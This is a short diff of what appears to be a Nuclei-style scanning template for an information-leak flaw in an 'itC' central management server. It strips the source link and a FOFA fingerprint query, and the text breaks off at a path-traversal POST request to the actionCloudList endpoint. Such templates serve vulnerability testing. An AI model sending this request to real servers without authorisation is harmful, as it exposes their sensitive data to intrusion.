@@ -3,12 +3,8 @@ info:
   name: itC 中心管理服务器actionCloudList存在敏感信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/magf7kdxuhx32oap'
+  description: ''
   tags: info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: magf7kdxuhx32oap
-    fofa: body="/mt_res_v3/img/public/logo.ico"
 http:
 - raw:
   - 'POST /sdk/../vcs/actionCloudList.do HTTP/1.1
